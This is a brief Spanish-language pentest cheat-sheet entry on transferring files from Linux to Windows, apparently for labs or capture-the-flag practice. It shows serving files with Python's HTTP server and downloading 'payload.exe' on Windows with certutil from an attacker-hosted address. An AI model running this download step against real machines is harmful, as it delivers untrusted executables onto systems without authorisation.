# Transferir archivos

## Descripción
En este sección se habla de la transferencia de archivos entre sistemas operativos como Windows y Linux

### Linux to Windows

```python
command in linux (first)
python3 -m http.server 80 (habilitamos el servidor local en linux)
python -m SimpleHTTPServer 80 (otra forma de habilitar el servidor local)
command in windows
certutil -urlcache -f http://10.10.23.2/payload.exe payload.exe (este comando se ejecuta en windows)
```

